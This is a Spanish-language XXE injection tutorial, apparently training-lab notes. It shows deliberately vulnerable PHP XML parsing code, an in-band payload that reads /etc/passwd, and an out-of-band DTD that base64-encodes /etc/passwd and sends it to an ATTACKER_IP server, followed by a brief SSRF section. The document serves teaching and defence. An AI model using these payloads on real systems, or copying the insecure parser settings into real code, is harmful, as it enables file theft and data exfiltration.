# Introducción

XXE (XML External Entity) Es un tipo de injección que explota las vulnerabilidades de una aplicacion via XML. Esto occure cuando la apclicacion acpeta un input XML inclute entidades external. Los atacantes pueden acceder a archivos locales, hacer consultas al servidor, o ejecutar código remoto.

## Objetivos

- Reconocer los conceptos fundamentales y peligrosos asociadas a la injección XXE
- Identificar Vulnerabilidades XXE procesar configuraciones y practicas
- Desarrollar técnicas de deteccion, explotación y mitigación de dicha vulnerabilidad

# Explorar XML

XML (Extensible Markup Language) Es un lenguaje de amrgado de SGML (Standart Generalized Markup Language) tiene la misma base del estándar HTML. Normalmente usado en aplicaciones para guardar y tansportar datos en formato de lectua humano. 

## Sintaxis y Estructura

```
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

## XSLT

XSLT (Exstensible Stylesheet Language Transformation) Es un lenguaje usado para transformar en documentos XML. Mientras XSLT es normalmente usado para transformar datos y formatting. 

Se usa para:

1.Data Extraction
2.Entity Expansion
3.Data Manipulation
4.Blind XXE

## Que son los DTDs

DTDs o Document Type Definitions definen la estructura y construcción de un documentos XML. Ellos especifical los elementos, atributos, y relaciones entre ellos. 

Proposito:

- Validacion
- Enity Declaration

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

## DTDs y XXE

DTds Juegan un papel crucial en las injecciones XXE, ellos son los que declaran las entidades external. Se refieren a archivos externos o URLs

## Entidades XML

Son los que gaurdan los datos o cóidgo que se expanden con el documento XML. Hay 5 tipos de entidades:internas, external, parametrales, generales y caracteres

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

![image](https://github.com/user-attachments/assets/adea0416-6dec-4a29-afaa-245fc3a4c188)

# XML Mecanismos de análisis

Es el proceso que hace XML para leer un arcivo, esta iformación es accesible y manipulable con el software del programa. SML convierte los datos del formato XML dentro de la estructura del programa como por ejemplo (DOM tree). Durante el proceso, se valida los datos XML con un esquema, asegurandose que una estructura contiene las reglas.

Si un mecanismo es configurado con un proceso externo, hay que tener autorizació nde acceso al archivo, sistemas internos o páginas externas.

## COmmon XML Mecanismos

- DOM: (Document Object Model)
- SAX (Simple API for XML)
- StaX (Streaming API for XML)
- Xpath Parser

# Explotar XXE- In-Band

## In-Band vs Out-Of-Band

IN-band XXE se refiere a vulnerabilidades cuando el atacante ve la respuesta del servidor. Esto da casos de filtración de datos y explotación. Los atacatantes mandan código malicoso a la aplicación, el servidor puede responder con los datos extraidor o resultado de lataque

Out-of-band es la otra cara, se refiere a una vulnerablidad donde el atacante no puede ver la respuesta de lservidor.

## In-Band Explotation

![image](https://github.com/user-attachments/assets/f1b06619-a7d3-4a9e-aa06-9fc5bec2fb50)

![image](https://github.com/user-attachments/assets/88e84c62-eab4-49b2-86f4-6043fe85c2be)

```
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

![image](https://github.com/user-attachments/assets/41d3d37e-e58a-461a-8788-10d7de918734)

# Explotando XXE-Out-of-Band

En la otra mano demostraremos la vulnerabilidad, que `podemos subir archivos

```
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

El código no devuelve los valores de los datos XML, el termino Out-Of-Band es filtrar los datos capturados usando el servidor como ataque

Para este ataque, nosotros necesitamos un servidor para recibir los datos de otros servidores. Podemos usar Python http.server donde hay otra opciones como apache o ngnix para la subida de arhcivos

![image](https://github.com/user-attachments/assets/fdbf2078-effa-49ce-8ff9-613f94a79f7b)

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

![image](https://github.com/user-attachments/assets/332e6378-50c4-4928-9c07-fb31a58713ca)

Despues de modificar la consulta HTTP, el servidor recibira la consulta y se creara un filtro

Ahora podemos crear nuestro propio archivo DTD conteniendo entidades externas para filtrar datos

```
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

Explicación

- El inicio comienza con la declaración %cmd los puntos de los recursos del sistema. El %cmd se refiere al recurso cuando el filtro PHP php://Filter. Devuelve el contnid /etc/paswd, en un archivo aextanar, luego lo convierte en base64 codificandolo. La entidad %oobxxe contiene declaraciónes CML, el exfil se usa para identificar los puntos de lssitema y el %cmd rerpesenta el contenido de base64 codificado.

![image](https://github.com/user-attachments/assets/be0e64d1-b9e1-42eb-b026-b10d96cd61ec)

![image](https://github.com/user-attachments/assets/ef04a826-27d9-40d2-be24-1e335a4b81ff)


# SSRF + XXE

Server-Side Request Forgery (SSRF) Ocurre cuand oel atacante abusca funcionalidades del servidor, causando al servidor que haga ocnsultas en localizaciones no intencionadas. En el contexto de una XXE, el atacatne manipula input XML para hacer al servidor consultas que no son verdaderos en servicios internos. La técnica se usa para escanear reter internas, acceder a endporint o interactura con serivicos que son accesibles del servidor local




